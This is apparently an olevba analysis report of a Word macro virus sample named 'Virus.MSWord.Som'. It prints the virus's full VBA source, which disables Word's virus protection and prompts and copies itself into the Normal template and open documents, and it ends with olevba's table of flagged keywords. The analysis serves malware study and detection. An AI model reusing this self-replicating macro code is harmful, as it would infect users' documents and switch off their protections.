olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Som
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Som - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Thanks Mr Ethan Frome...
'Sorry anyway...
On Error Resume Next

Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

If Dir("c:\grover.___", 6) = "" Then
 Open "c:\grover.___" For Output As #1

 For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Print #1, a
 Next i
 
 Close #1
 SetAttr "c:\grover.___", 6
End If

If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"

b = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, b
b = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, b

Open "c:\grover.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill "c:\grover.___"
End Sub

Private Sub Document_Open()
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
End Sub

Private Sub Document_new()
ActiveDocument.ShowGrammaticalErrors = False
ActiveDocument.Content.Font.Size = 24
ActiveDocument.Content.Font.NameAscii = "Arial"
ActiveDocument.Content.Font.Bold = True
ActiveDocument.Content.ParagraphFormat.Alignment = wdAlignParagraphCenter
ActiveDocument.Content.Font.Animation = wdAnimationShimmer
ActiveDocument.Content.Text = "!MOSH to Super Grover!"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

